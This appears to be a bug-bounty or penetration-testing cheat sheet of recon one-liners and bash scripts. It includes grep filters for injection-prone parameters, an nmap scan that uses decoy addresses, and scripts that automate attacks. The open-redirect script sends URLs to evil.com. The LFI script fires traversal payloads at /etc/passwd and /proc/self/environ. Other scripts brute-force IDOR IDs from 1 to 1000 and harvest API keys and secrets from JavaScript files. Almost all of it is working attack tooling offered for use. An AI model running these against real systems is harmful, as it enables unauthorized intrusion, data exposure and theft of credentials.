# Arsenal

## Uncover

```uncover -silent -s 'ssl.cert.subject.CN:"target.com" -http.title:"Invalid URL" -http.title:"ERROR: The request could not be satisfied"' | sort -u```

## Uncover 2

```uncover -q 'target.com' -e "shodan, shodanIb, hunterio, criminalip, Zoomeye, Censys, netlas, fullhunt, hunterhow, publicwww" -silent```

## Uncover Wildcards

```for i in `cat wildcards.txt`; do uncover -l 6000 -silent -s "ssl.cert.subject.CN:\"$i\"" | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u | anew ips.txt; done```

## ASNs Google Dork

```site:ipinfo.io "Steam"```

## Create IIS Wordlist

```egrep -ri ^WEB /opt/useful/SecLists/ | sed 's/^[^:]*://' | anew list.txt```

#

# One-liners

## SQLI Prone Params

`cat uri.txt | uro | sort -u | grep -Ei '\?(id|param|order_id|cat_id|form|form_id|sid|cat|category|pid|action)='`

## XSS Prone Params

`cat uri.txt | uro | sort -u | grep -Ei '\?(name|query|search|keyword|username|email|message|comment|body|input|value|arg|data|q|param|lang|s)='`

## Open Redirect Prone Params

`cat uri.txt | uro | sort -u | grep -Ei '\?(url|uri|path|dest|destination|redir|redirect_uri|redirect_url|redirect|forward|callback|continue|link|next|return|goto|rurl|target|out|view|ref|feed|data|port|domain|load|site|source|window|dir|show|navigation|open|file|val|validate|loginto|image_url|go|returnTo|return_to|checkout_url|reference|page|host)='`

## Automate Open Redirect

```
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <input_file_with_parameters>"
    exit 1
fi

input_file="$1"

user_agent="Mozilla/5.0 (compatible; OpenRedirectHunter/1.0)"

evil_url="https://evil.com"

output_file="open_redirect_results.txt"

> "$output_file"

while read url; do
    response=$(curl -s -L -A "$user_agent" -o /dev/null -w "%{url_effective}" "$url=$evil_url")

    if [[ "$response" == *"$evil_url"* ]]; then
        echo "[+] Open Redirect Found: $url" | anew -q "$output_file"
    fi
done < "$input_file"

echo "Open Redirect Scan Completed. Results saved to $output_file"
```

## Sensitive Files and Directories

`cat uri.txt | uro | sort -u | grep -Ei 'admin|dashboard|panel|phpmyadmin|wp-admin|confluence|secureadmin|sitemanager|drupal|config|myadmin|sqladmin|grafana|kibana|metrics|backup|api|zabbix|prometheus|splunk|database|phppgadmin|ghost|joomla'`

## Common backup, logs, and configuration files, vulnerable endpoints

`cat uri.txt | uro | sort -u | sort -u | grep -Ei '(\.git|\.svn|\.backup|\.env|\.bak|\.old|\.log|\.conf|\.config|\.ini|\.sql|\.dump|xmlrpc\.php|_fragment|env\.js|\.gitlab-ci\.yml|\.cgf|\.xml|\.xls|\.xlsx|\.json|\.war|\.ear|\.sqlitedb|\.sqlite3|\.properties|\.pem|\.key|tar\.gz|.\py|\.sh)$'`

## Common patterns for file inclusion and directory traversal

`cat uri.txt | uro | sort -u | grep -Ei '\?(file|page|path|doc|folder|dir|inc|locate|conf)='`

## Automate LFI

```
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <input_file_with_parameters>"
    exit 1
fi

input_file="$1"

user_agent="Mozilla/5.0 (compatible; LFIHunter/1.0)"

lfi_payloads=("../../../../etc/passwd" "../../../../../../../../etc/passwd" "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini" "../../../../../../../../etc/hosts" "../../../../../../../../proc/self/environ")

output_file="lfi_results.txt"

> "$output_file"

while read url; do
    for payload in "${lfi_payloads[@]}"; do
        response=$(curl -s -A "$user_agent" "$url=$payload")

        if [[ "$response" == *"root:x:"* || "$response" == *"[extensions]"* || "$response" == *"localhost"* || "$response" == *"USER_AGENT"* ]]; then
            echo "[+] LFI Found: $url with payload: $payload" | anew -q "$output_file"
            break
        fi
    done
done < "$input_file"

echo "LFI Scan Completed. Results saved to $output_file"
```

## Common parameters for session management

`cat uri.txt | uro | sort -u | grep -Ei '\?(token|auth|session|sid|csrf|xsrf)='`

## Common parameters used in command injection

`cat uri.txt | sort -u | grep -Ei '\?(cmd|exec|command|run|execute|shell)='`

## Regex for API Enumeration

`cat uri.txt | sort -u | grep -Ei '/api/v[1-3]/[a-z]+/[0-9]+|/api/[0-9]+/[a-z]+/[0-9]+|/v[0-9]+/[a-z]+/[0-9]+|/rest(/v[0-9]+)?/|/graphql|/swagger|/auth|/internal/create/get/post|'`

## IDOR Prone Endpoints & Params

`cat uri.txt | sort -u | grep -Ei '(user|order|product|api|invoice|account|profile)/[0-9]+|[a-fA-F0-9-]{36}|\?invoice=|changepassword\?user=|showImage|accessPage\?menuitem=|user_id=|file_id=|MyPictureList=|profile_id=|account_id=|order_id=|page_id=|product_id=|session_id=|invoice_id=|doc_id='`

## Automate IDOR

```
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <input_file_with_parameters>"
    exit 1
fi

input_file="$1"

user_agent="Mozilla/5.0 (compatible; IDORHunter/1.0)"

start_id=1
end_id=1000

keywords=("username" "email" "admin" "user_id" "password" "token" "session" "profile" "account" "balance" "order" "invoice" "credit" "data" "info" "details" "access" "role" "customer" "user" "client")

output_file="idor_results.txt"

> "$output_file"

while read url; do
    for i in $(seq $start_id $end_id); do
        response=$(curl -s -A "$user_agent" "$url=$i")

        for keyword in "${keywords[@]}"; do
            if [[ "$response" == *"$keyword"* ]]; then
                echo "[+] Possible IDOR at: $url=$i (Found: $keyword)" | anew -q "$output_file"
                break
            fi
        done
    done
done < "$input_file"

echo "IDOR Scan Completed. Results saved to $output_file"
```

## Regex for XXE

`cat uri.txt | sort -u | grep -Ei "(xml|data|content|file|input|entity|config|document|payload|request)="`

## Regex for SSTI

`cat uri.txt | sort -u | grep -Ei "(template|name|message|user|description|email|subject|content|query|title)="`

## Fast Nmap Scan

`ports=$(nmap -p- --min-rate=1000 -T4 -Pn $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && nmap -p$ports -sC -sV -D RND:13.37.73.31 -Pn $IP --min-rate=500 -T4`

## Automate API Keys

```
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <input_file_with_js_paths>"
    exit 1
fi

input_file="$1"

keywords=("api_key" "token" "secret" "client_id" "authorization" "access_key" "private_key" "bearer" "aws_secret" "auth")

output_file="api_keys.txt"

> "$output_file"

while read js_file; do
    for keyword in "${keywords[@]}"; do
        grep -E -i "$keyword" "$js_file" >> "$output_file"
    done
done < "$input_file"

sort -u "$output_file" -o "$output_file"

echo "API Key Scan Completed. Results saved to $output_file"
```
